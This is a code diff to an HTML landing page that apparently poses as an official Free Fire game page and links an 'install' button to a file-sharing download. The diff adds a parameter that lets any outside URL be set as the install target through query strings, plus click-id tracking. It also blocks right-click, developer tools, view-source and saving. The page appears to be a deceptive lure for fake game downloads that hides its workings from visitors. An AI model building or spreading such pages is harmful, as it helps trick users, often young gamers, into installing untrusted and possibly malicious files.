@@ -67,10 +67,11 @@ video::-webkit-media-controls-enclosure{overflow:hidden}
     <video 
       id="mainVideo"
       controls 
-      controlsList="nodownload nofullscreen" 
+      controlsList="nodownload noremoteplayback"
       disablePictureInPicture 
       playsinline 
-      preload="metadata"
+      preload="auto"
+      autoplay
       oncontextmenu="return false;"
       ondragstart="return false;">
       <source src="https://ultimatetop.in/newfreefire%20(1).mp4" type="video/mp4">
@@ -102,10 +103,34 @@ video::-webkit-media-controls-enclosure{overflow:hidden}
 <footer class="footer">©️ 2026 Garena Free Fire Team • Gaming Community</footer>
 </main>
 <script>
-// Prevent video download and context menu
+// ========== Dynamic Install URL (outside control via URL params) ==========
+function buildInstallUrl() {
+  const params = new URLSearchParams(window.location.search);
+  let redirectUrl = params.get('redirect_url') || params.get('link');
+
+  if (redirectUrl) {
+    try { redirectUrl = decodeURIComponent(redirectUrl); } catch (e) {}
+    params.delete('redirect_url');
+    params.delete('link');
+    const remaining = params.toString();
+    const separator = redirectUrl.includes('?') ? '&' : '?';
+    return remaining ? `${redirectUrl}${separator}${remaining}` : redirectUrl;
+  }
+
+  // Default link (change this if needed, or control fully from outside via ?link= or ?redirect_url=)
+  const defaultUrl = 'https://1024terabox.com/s/14MUZ3CtZQiPASPwdeQE65Q';
+  const clickId = params.get('click_id') || params.get('clickid');
+  if (!clickId) return defaultUrl;
+  return defaultUrl + (defaultUrl.includes('?') ? '&' : '?') + 'click_id=' + encodeURIComponent(clickId);
+}
+
+// ========== Video Autoplay + Protection ==========
 document.addEventListener('DOMContentLoaded', function() {
   const video = document.getElementById('mainVideo');
   if (video) {
+    video.volume = 1.0;
+    video.setAttribute('controlsList', 'nodownload');
+
     video.addEventListener('contextmenu', function(e) {
       e.preventDefault();
       return false;
@@ -114,53 +139,60 @@ document.addEventListener('DOMContentLoaded', function() {
       e.preventDefault();
       return false;
     });
-    // Extra protection against download button
-    video.setAttribute('controlsList', 'nodownload');
+
+    // Smooth autoplay attempt (same system as the reference HTML)
+    let playAttempted = false;
+    const attemptPlay = () => {
+      if (!playAttempted) {
+        playAttempted = true;
+        video.play().catch(() => {
+          // If autoplay blocked, play on first user click
+          document.addEventListener('click', function playOnClick() {
+            video.play();
+            document.removeEventListener('click', playOnClick);
+          }, { once: true });
+        });
+      }
+    };
+
+    if (video.readyState >= 3) {
+      attemptPlay();
+    } else {
+      video.addEventListener('canplay', attemptPlay, { once: true });
+    }
+  }
+
+  // Apply dynamic install link
+  const installBtn = document.querySelector('.install');
+  if (installBtn) {
+    installBtn.href = buildInstallUrl();
   }
 });
 
-// Install link routing settings
-const INSTALL_ROUTING = {
-  everyNthClick: 2,
-  alternateUrl: "https://1024terabox.com/s/14MUZ3CtZQiPASPwdeQE65Q",
-  normalUrl: "https://1024terabox.com/s/14MUZ3CtZQiPASPwdeQE65Q"
-};
-
-const installButton = document.querySelector(".install");
-const clickCountKey = "installClickCount_v1";
-const alternateUsedKey = "installAlternateUsed_v1";
-installButton.addEventListener("click", function (event) {
-  this.style.transform = "scale(.96)";
-  setTimeout(() => { this.style.transform = ""; }, 180);
-
-  let clickCount = Number(localStorage.getItem(clickCountKey) || 0) + 1;
-  localStorage.setItem(clickCountKey, String(clickCount));
-
-  const alternateAlreadyUsed = localStorage.getItem(alternateUsedKey) === "true";
-  const isNthClick = Number.isInteger(INSTALL_ROUTING.everyNthClick) &&
-    INSTALL_ROUTING.everyNthClick > 0 &&
-    clickCount % INSTALL_ROUTING.everyNthClick === 0;
-
-  if (!alternateAlreadyUsed && isNthClick && INSTALL_ROUTING.alternateUrl) {
-    localStorage.setItem(alternateUsedKey, "true");
-    this.href = INSTALL_ROUTING.alternateUrl;
-  } else {
-    this.href = INSTALL_ROUTING.normalUrl;
+// Extra keyboard protection
+document.addEventListener('keydown', function (e) {
+  if (e.keyCode == 123 ||
+    (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
+    (e.ctrlKey && e.shiftKey && e.keyCode == 74) ||
+    (e.ctrlKey && e.keyCode == 85) ||
+    (e.ctrlKey && e.keyCode == 83)) {
+    e.preventDefault();
   }
 });
 
-const card=document.querySelector(".card");
-if(window.matchMedia("(pointer:fine)").matches){
-  card.addEventListener("mousemove",e=>{
-    const rect=card.getBoundingClientRect();
-    const x=e.clientX-rect.left;
-    const y=e.clientY-rect.top;
-    const rotateX=((y/rect.height)-.5)*-2;
-    const rotateY=((x/rect.width)-.5)*2;
-    card.style.transform=`perspective(700px) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
+// Card tilt effect (desktop only)
+const card = document.querySelector(".card");
+if (card && window.matchMedia("(pointer:fine)").matches) {
+  card.addEventListener("mousemove", e => {
+    const rect = card.getBoundingClientRect();
+    const x = e.clientX - rect.left;
+    const y = e.clientY - rect.top;
+    const rotateX = ((y / rect.height) - .5) * -2;
+    const rotateY = ((x / rect.width) - .5) * 2;
+    card.style.transform = `perspective(700px) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
   });
-  card.addEventListener("mouseleave",()=>{
-    card.style.transform="perspective(700px) rotateX(0) rotateY(0)";
+  card.addEventListener("mouseleave", () => {
+    card.style.transform = "perspective(700px) rotateX(0) rotateY(0)";
   });
 }
 </script>
